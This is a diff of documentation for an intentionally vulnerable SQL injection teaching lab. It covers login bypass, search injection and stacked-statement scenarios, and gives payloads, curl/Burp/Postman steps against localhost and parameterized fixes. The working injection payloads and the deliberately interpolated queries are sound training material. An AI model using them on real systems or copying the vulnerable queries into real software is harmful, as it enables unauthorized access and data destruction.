@@ -1,150 +1,250 @@
-# SQL injection scenarios (CWE-89)
+# Module: SQL injection (CWE-89)
 
-All scenarios run against the in-memory PGlite instance (see [architecture.md](../architecture.md)). Every scenario has an unsafe endpoint that interpolates user input into SQL and a safe endpoint that receives the **identical payload** as a bound parameter. `POST /api/lab/reset` restores the seed data at any time.
+All scenarios run against the in-memory PGlite instance (see [architecture](../architecture.md)). Every scenario has an **unsafe** endpoint that interpolates user input into SQL and protected endpoints that receive the **identical payload** as data — via bound parameters (`/api/sql/safe/*`) and via Zod schema validation feeding the same bound parameters (`/api/sql/zod/*`). `POST /api/lab/reset` restores the seed data at any time.
 
-Lab credentials: `alice / alice-lab-only`, `admin / admin-lab-only`. The login endpoints perform a demo identity check only — no session or cookie is created.
+Lab credentials: `alice / alice-lab-only`, `admin / admin-lab-only`. Login endpoints perform a demo identity check only — no session or cookie is created.
+
+## Contents
+
+| Scenario | Agent ref | Student guide | Exploit lab | Vuln vs protected | Tests |
+| --- | --- | --- | --- | --- | --- |
+| [SQL-001 · Login bypass](#sql-001) | [expected finding](#sql-001-agent) | [guide](#sql-001-student) | [Burp · Postman · curl](#sql-001-exploit) | [comparison](#sql-001-safe) | [tests](#sql-001-tests) |
+| [SQL-002 · Search injection](#sql-002) | [expected finding](#sql-002-agent) | [guide](#sql-002-student) | [Burp · Postman · curl](#sql-002-exploit) | [comparison](#sql-002-safe) | [tests](#sql-002-tests) |
+| [SQL-003 · Stacked statements](#sql-003) | [expected finding](#sql-003-agent) | [guide](#sql-003-student) | [Burp · Postman · curl](#sql-003-exploit) | [comparison](#sql-003-safe) | [tests](#sql-003-tests) |
 
 ---
 
+<a id="sql-001"></a>
 ## SQL-001 · Login bypass
+
+<a id="sql-001-agent"></a>
+### Agent reference — expected finding
 
 | Field | Value |
 | --- | --- |
 | Source | `pages/api/sql/unsafe/login.js` |
-| Safe control | `pages/api/sql/safe/login.js` |
-| Route / endpoint | `/sql/login` → `POST /api/sql/{unsafe,safe}/login` |
-| Data flow | JSON `username`/`password` → string interpolation → `db.query` |
-| Expected finding | SAST: SQL injection, CWE-89 |
+| Safe controls | `pages/api/sql/safe/login.js` (bound parameters) · `pages/api/sql/zod/login.js` (Zod + bound parameters) |
+| Endpoint | `POST /api/sql/{unsafe,safe,zod}/login` |
+| Sink | string interpolation into `db.query` |
+| Flow | JSON `username`/`password` → `'…${username}…${password}…'` |
+| Tests | `tests/unit/sql.test.mjs`; `tests/unit/zod.test.mjs`; `scripts/test-http.mjs` |
 
-### The flaw
+**Expected finding:** SAST reports SQL injection (CWE-89) on both interpolated fields.
+
+[Student guide](#sql-001-student) · [Exploit lab](#sql-001-exploit) · [Vuln vs protected](#sql-001-safe) · [Tests](#sql-001-tests)
+
+<a id="sql-001-student"></a>
+### Student guide
 
 ```js
-const { rows } = await db.query(
-  `SELECT id, username, role FROM users WHERE username = '${username}' AND password_demo = '${password}' LIMIT 1`);
+`SELECT id, username, role FROM users WHERE username = '${username}' AND password_demo = '${password}' LIMIT 1`
 ```
 
-Both fields are spliced into the statement. The unsafe login compares against the lab-only `password_demo` column so that a classic comment payload can bypass it.
+The comment payload `admin' --` closes the username string and comments out the password check; a tautology in the password field (`' OR true --`) bypasses equally. The unsafe login compares the lab-only `password_demo` column so the classic payload works; the protected logins verify a salted scrypt hash instead.
 
-### Exploit it
+<a id="sql-001-exploit"></a>
+### Exploit lab
 
-```bash
-curl -s http://127.0.0.1:3000/api/sql/unsafe/login \
-  -H 'Content-Type: application/json' \
-  -d '{"username":"admin' --","password":"wrong"}'
-```
+Payload: `{"username":"admin' --","password":"wrong"}` — success is `200` with `"role":"admin"` despite the wrong password.
 
-Shell-safe form (recommended):
+**Burp Suite**
+
+1. Open `/sql/login` in the embedded browser, choose **unsafe** mode, press **Run unsafe example** with the loaded injection sample.
+2. Send the captured `POST /api/sql/unsafe/login` to Repeater; **Send** → `"role": "admin"`.
+3. Right-click → change the path to `/api/sql/safe/login` (and again `/api/sql/zod/login`), **Send** → `401 {"authenticated":false}` for the identical body.
+
+**Postman**
+
+1. `POST http://127.0.0.1:3000/api/sql/unsafe/login`, header `Content-Type: application/json`, raw body = payload → 200 as admin.
+2. Duplicate the tab twice, changing only the path to `/api/sql/safe/login` and `/api/sql/zod/login` → both 401.
+
+**curl**
 
 ```bash
 curl -s http://127.0.0.1:3000/api/sql/unsafe/login \
   -H 'Content-Type: application/json' \
   --data-raw '{"username":"admin'"'"' --","password":"wrong"}'
+# → 200, "role": "admin"
+
+curl -s -w '\n%{http_code}\n' http://127.0.0.1:3000/api/sql/safe/login \
+  -H 'Content-Type: application/json' \
+  --data-raw '{"username":"admin'"'"' --","password":"wrong"}'
+# → 401 {"authenticated":false}   (zod endpoint behaves the same)
 ```
 
-Response: `200` with `"role": "admin"` — authentication succeeded with a wrong password because `--` comments out the password check. A tautology in the password field (`' OR true --` with any username) bypasses the same way. The page `/sql/login` has buttons that load these payloads.
+**Observation that proves exploitation:** admin identity returned with a wrong password (unsafe) vs 401 for the identical payload (protected).
 
-### Safe control
+<a id="sql-001-safe"></a>
+### Vulnerable vs protected — and why
 
-`pages/api/sql/safe/login.js` binds the username as a parameter and verifies the salted **scrypt hash**, never a stored plaintext:
+| | Vulnerable | Protected (parameterized) | Protected (Zod + parameters) |
+| --- | --- | --- | --- |
+| Route | `POST /api/sql/unsafe/login` | `POST /api/sql/safe/login` | `POST /api/sql/zod/login` |
+| Source | `pages/api/sql/unsafe/login.js` | `pages/api/sql/safe/login.js` | `pages/api/sql/zod/login.js` |
+| Mechanism | interpolation into the SQL text | `WHERE username = $1` + scrypt hash verify | `Credentials.safeParse(body)` then the same `$1` query |
+| Same payload → | authenticated as admin | 401 | 401 (well-formed strings reach the query and match nothing) |
 
-```js
-const { rows } = await db.query('SELECT ... WHERE username = $1', [username]);
-if (!user || !verifyPassword(password, user.password_hash)) return res.status(401)...
-```
+**Why the controls work:** a bound parameter is transmitted to PostgreSQL as a value, not SQL grammar — the payload never rewrites the statement, which is also why legitimate apostrophes keep working. The Zod layer adds *shape* enforcement (types, lengths) before any query runs: it rejects `{"username": 42}` outright, but note it deliberately does **not** reject quote characters — validation complements parameterization, it cannot replace it. The password check also moves to a salted hash comparison, removing the plaintext-comparison weakness the unsafe route relies on.
 
-Send the same bypass payload to `/api/sql/safe/login` → `401 {"authenticated":false}`. Apostrophes in legitimate usernames/passwords also work normally — evidence the protection comes from parameterization, not from rejecting quotes.
+<a id="sql-001-tests"></a>
+### Automated tests
 
-### Tests
-
-- `tests/unit/sql.test.mjs`: valid/invalid logins on both; comment bypass and tautology bypass succeed only on unsafe; safe rejects payload in either field.
+- `tests/unit/sql.test.mjs`: comment and tautology bypasses succeed only on unsafe; valid/invalid logins on all; response never leaks hash columns.
+- `tests/unit/zod.test.mjs`: zod control rejects bad shapes (empty/oversized/wrong type) with 400 and treats the bypass payload as data (401).
 - `scripts/test-http.mjs` repeats the pair over HTTP.
 
 ---
 
+<a id="sql-002"></a>
 ## SQL-002 · Product search injection
+
+<a id="sql-002-agent"></a>
+### Agent reference — expected finding
 
 | Field | Value |
 | --- | --- |
 | Source | `pages/api/sql/unsafe/products.js` |
-| Safe control | `pages/api/sql/safe/products.js` |
-| Route / endpoint | `/sql/products` → `GET /api/sql/{unsafe,safe}/products?q=` |
-| Data flow | `query.q` → ILIKE pattern interpolation → `db.query` |
-| Expected finding | SAST: SQL injection, CWE-89 |
+| Safe controls | `pages/api/sql/safe/products.js` · `pages/api/sql/zod/products.js` |
+| Endpoint | `GET /api/sql/{unsafe,safe,zod}/products?q=` |
+| Sink | ILIKE pattern interpolation |
+| Flow | `query.q` → `'…ILIKE '%${q}%…'` |
+| Tests | `tests/unit/sql.test.mjs`; `tests/unit/zod.test.mjs`; `scripts/test-http.mjs` |
 
-### The flaw
+**Expected finding:** SAST reports SQL injection (CWE-89) on the interpolated search term.
+
+[Student guide](#sql-002-student) · [Exploit lab](#sql-002-exploit) · [Vuln vs protected](#sql-002-safe) · [Tests](#sql-002-tests)
+
+<a id="sql-002-student"></a>
+### Student guide
 
 ```js
-const { rows } = await db.query(
-  `SELECT ... FROM products WHERE public = true AND name ILIKE '%${q}%' ORDER BY id`);
+`SELECT ... WHERE public = true AND name ILIKE '%${q}%' ORDER BY id`
 ```
 
-The intended predicate only lists public products; the interpolated term can rewrite the WHERE clause and disclose the hidden `Internal prototype` row.
+The intended predicate lists public products only. `' OR true --` rewrites the WHERE clause to match everything, disclosing the hidden `Internal prototype` row — an authorization boundary crossed through data, without changing any code.
 
-### Exploit it
+<a id="sql-002-exploit"></a>
+### Exploit lab
+
+Payload: `q=' OR true --` (URL-encoded `%27%20OR%20true%20--`).
+
+**Burp Suite**
+
+1. From `/sql/products` (unsafe mode, **Load injection example**, Run) capture `GET /api/sql/unsafe/products?q=...`; send to Repeater; **Send** → 3 rows including `Internal prototype`.
+2. Change the path to `/api/sql/safe/products` → identical query returns `[]`.
+
+**Postman**
+
+1. `GET http://127.0.0.1:3000/api/sql/unsafe/products?q=%27%20OR%20true%20--` → 3 products.
+2. Same URL against `/api/sql/safe/products` (and `/api/sql/zod/products`) → empty list; `?q=mug` works on all three.
+
+**curl**
 
 ```bash
-curl -s 'http://127.0.0.1:3000/api/sql/unsafe/products?q=%27%20OR%20true%20--'
+curl -s 'http://127.0.0.1:3000/api/sql/unsafe/products?q=%27%20OR%20true%20--'   # 3 rows
+curl -s 'http://127.0.0.1:3000/api/sql/safe/products?q=%27%20OR%20true%20--'    # []
 ```
 
-That URL-decodes to `q=' OR true --`. The unsafe response lists **3** products including `Internal prototype`; the safe endpoint with the identical query returns an empty list. Normal searches (`?q=mug`) behave the same on both.
+**Observation that proves exploitation:** the private product appears only through the unsafe route.
 
-### Safe control
+<a id="sql-002-safe"></a>
+### Vulnerable vs protected — and why
 
-`pages/api/sql/safe/products.js` binds the pattern:
+| | Vulnerable | Protected (parameterized) | Protected (Zod + parameters) |
+| --- | --- | --- | --- |
+| Route | `GET /api/sql/unsafe/products` | `GET /api/sql/safe/products` | `GET /api/sql/zod/products` |
+| Source | `pages/api/sql/unsafe/products.js` | `pages/api/sql/safe/products.js` | `pages/api/sql/zod/products.js` |
+| Mechanism | `ILIKE '%${q}%'` | `ILIKE $1` with `['%' + q + '%']` | `z.object({ q: z.string().max(200) })` then `ILIKE $1` |
+| Same payload → | 3 rows (hidden row disclosed) | 0 rows | 0 rows |
 
-```js
-await db.query('... WHERE public = true AND name ILIKE $1 ORDER BY id', [`%${q}%`]);
-```
+**Why the controls work:** as a bound value, `' OR true --` is just a product name that matches nothing. **Scope note:** parameterization defeats injection; it is not an authorization control — which rows are public remains the query's own business rule.
 
-Note the scope of this control: parameterization defeats SQL **injection**. It is not an authorization control — which rows are *public* is a business rule the query still enforces on its own terms.
+<a id="sql-002-tests"></a>
+### Automated tests
 
-### Tests
-
-- `tests/unit/sql.test.mjs`: 3 rows (including the private product) via unsafe, 0 rows via safe, identical baseline counts, apostrophe search works safely.
+- `tests/unit/sql.test.mjs`: 3 rows via unsafe (including the private product), 0 via safe; identical baselines; apostrophe search works safely.
+- `tests/unit/zod.test.mjs`: zod control returns 0 rows for the payload and 400 for oversized input.
 - `scripts/test-http.mjs` repeats the pair over HTTP.
 
 ---
 
+<a id="sql-003"></a>
 ## SQL-003 · Note write with stacked statements
+
+<a id="sql-003-agent"></a>
+### Agent reference — expected finding
 
 | Field | Value |
 | --- | --- |
 | Source | `pages/api/sql/unsafe/notes.js` |
-| Safe control | `pages/api/sql/safe/notes.js` |
-| Route / endpoint | `/sql/notes` → `GET/POST /api/sql/{unsafe,safe}/notes` |
-| Data flow | JSON `body` → interpolation → `db.exec` (multi-statement) |
-| Expected finding | SAST: SQL injection, CWE-89 |
+| Safe controls | `pages/api/sql/safe/notes.js` · `pages/api/sql/zod/notes.js` |
+| Endpoint | `GET/POST /api/sql/{unsafe,safe,zod}/notes` |
+| Sink | `db.exec` (multi-statement) with interpolated note body |
+| Flow | JSON `body` → `INSERT … VALUES ('${body}', …)` |
+| Tests | `tests/unit/sql.test.mjs`; `tests/unit/zod.test.mjs`; `scripts/test-http.mjs` |
 
-### The flaw
+**Expected finding:** SAST reports SQL injection (CWE-89); the multi-statement sink additionally enables stacked queries (mutation/destruction, not just disclosure).
+
+[Student guide](#sql-003-student) · [Exploit lab](#sql-003-exploit) · [Vuln vs protected](#sql-003-safe) · [Tests](#sql-003-tests)
+
+<a id="sql-003-student"></a>
+### Student guide
 
 ```js
-const results = await db.exec(
-  `INSERT INTO notes (body, visibility) VALUES ('${body}', 'public') RETURNING ...`);
+await db.exec(`INSERT INTO notes (body, visibility) VALUES ('${body}', 'public') RETURNING ...`);
 ```
 
-`db.exec` executes **multiple statements**, so the note text can close the INSERT and append a second statement — an UPDATE, a DELETE, or even `DROP TABLE`.
+`db.exec` executes **multiple statements**, so the note text can close the INSERT and append a second statement — an `UPDATE`, a `DELETE`, or `DROP TABLE`. The demo payload publishes every product; a destructive variant works identically (reset recovers the schema).
 
-### Exploit it
+<a id="sql-003-exploit"></a>
+### Exploit lab
+
+Payload: `{"body":"lab', 'public'); UPDATE products SET public = true; --"}` — the note is stored *and* the stacked UPDATE runs.
+
+**Burp Suite**
+
+1. From `/sql/notes` (unsafe mode, **Load injection example**, Run) capture `POST /api/sql/unsafe/notes`; Repeater → **Send** → 201.
+2. In a second Repeater tab, `GET /api/sql/safe/products` → now 3 rows (the UPDATE worked).
+3. Re-send the same body to `/api/sql/safe/notes` after `POST /api/lab/reset` → 201, then `GET /api/sql/safe/products` → still 2 rows; `GET /api/sql/safe/notes` shows the payload stored verbatim.
+
+**Postman**
+
+1. `POST http://127.0.0.1:3000/api/sql/unsafe/notes` with the payload → 201.
+2. `GET .../api/sql/safe/products` → 3 rows.
+3. `POST http://127.0.0.1:3000/api/lab/reset` (empty JSON body), then repeat step 1 against `/api/sql/safe/notes` → 201, products stay 2, notes list shows the literal payload.
+
+**curl**
 
 ```bash
 curl -s http://127.0.0.1:3000/api/sql/unsafe/notes \
   -H 'Content-Type: application/json' \
   -d '{"body":"lab'"'"', '"'"'public'"'"'); UPDATE products SET public = true; --"}'
+curl -s http://127.0.0.1:3000/api/sql/safe/products   # 3 rows — stacked UPDATE ran
+
+curl -s -X POST http://127.0.0.1:3000/api/lab/reset -H 'Content-Type: application/json' -d '{}'
+curl -s http://127.0.0.1:3000/api/sql/safe/notes \
+  -H 'Content-Type: application/json' \
+  -d '{"body":"lab'"'"', '"'"'public'"'"'); UPDATE products SET public = true; --"}'
+curl -s http://127.0.0.1:3000/api/sql/safe/products   # still 2 rows — payload stored as text
 ```
 
-The note is stored *and* the stacked `UPDATE` publishes every product. Verify with `GET /api/sql/safe/products` — now 3 rows. Then repair with `POST /api/lab/reset`. (A `DROP TABLE notes` payload works identically and demonstrates destructive stacked SQL; reset recovers the schema too.)
+**Observation that proves exploitation:** product visibility changed (or a table dropped) through a note field (unsafe) vs the attack string stored verbatim with zero side effects (protected).
 
-### Safe control
+<a id="sql-003-safe"></a>
+### Vulnerable vs protected — and why
 
-`pages/api/sql/safe/notes.js` uses a parameterized single-statement INSERT:
+| | Vulnerable | Protected (parameterized) | Protected (Zod + parameters) |
+| --- | --- | --- | --- |
+| Route | `POST /api/sql/unsafe/notes` | `POST /api/sql/safe/notes` | `POST /api/sql/zod/notes` |
+| Source | `pages/api/sql/unsafe/notes.js` | `pages/api/sql/safe/notes.js` | `pages/api/sql/zod/notes.js` |
+| Mechanism | `db.exec` with interpolation (multi-statement) | single-statement `db.query` with `($1, $2)` | `Note.safeParse(body)` then the same single-statement query |
+| Same payload → | note stored **and** stacked UPDATE runs | note stored verbatim, nothing else executes | same, plus 400 for empty/oversized bodies |
 
-```js
-await db.query('INSERT INTO notes (body, visibility) VALUES ($1, $2) RETURNING ...', [body, 'public']);
-```
+**Why the controls work:** two independent properties. (1) Bound parameters keep the body out of SQL grammar. (2) `db.query` executes **one** statement, so even a hypothetical grammar escape could not chain a second — the unsafe route fails on both axes (`exec` + interpolation). Storing the attack string verbatim is the desired evidence: the *data* was never the problem.
 
-Post the identical payload to `/api/sql/safe/notes` → `201`, and the note body is stored **verbatim** (verify via `GET /api/sql/safe/notes`); the product table is untouched.
+<a id="sql-003-tests"></a>
+### Automated tests
 
-### Tests
-
-- `tests/unit/sql.test.mjs`: stacked mutation flips product visibility only through the unsafe write; the safe write stores the attack string literally; ordinary notes and apostrophes round-trip on both; reset restores schema after a `DROP TABLE`.
-- `scripts/test-http.mjs` repeats the scenario end-to-end over HTTP.
+- `tests/unit/sql.test.mjs`: stacked mutation flips visibility only via unsafe; safe write stores the string literally; apostrophes round-trip; reset recovers after `DROP TABLE`.
+- `tests/unit/zod.test.mjs`: zod write stores the payload verbatim with no product mutation; schema violations 400.
+- `scripts/test-http.mjs` repeats the scenario end-to-end.
